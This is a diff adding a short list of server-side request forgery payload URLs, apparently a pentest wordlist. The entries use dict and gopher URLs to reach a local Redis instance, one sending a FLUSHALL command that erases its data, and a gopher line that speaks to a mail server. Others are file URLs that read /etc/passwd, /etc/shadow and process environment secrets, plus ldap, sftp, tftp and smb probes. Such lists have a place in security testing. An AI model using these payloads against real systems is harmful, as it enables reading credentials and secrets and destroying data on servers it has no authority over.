@@ -1,0 +1,11 @@
+dict://127.0.0.1:6379/info
+dict://127.0.0.1:6379/set:key:value
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+gopher://127.0.0.1:25/xHELO%20localhost
+file:///etc/passwd
+file:///etc/shadow
+file:///proc/self/environ
+ldap://127.0.0.1/
+sftp://127.0.0.1
+tftp://127.0.0.1/TESTUDPPACKET
+smb://127.0.0.1/share
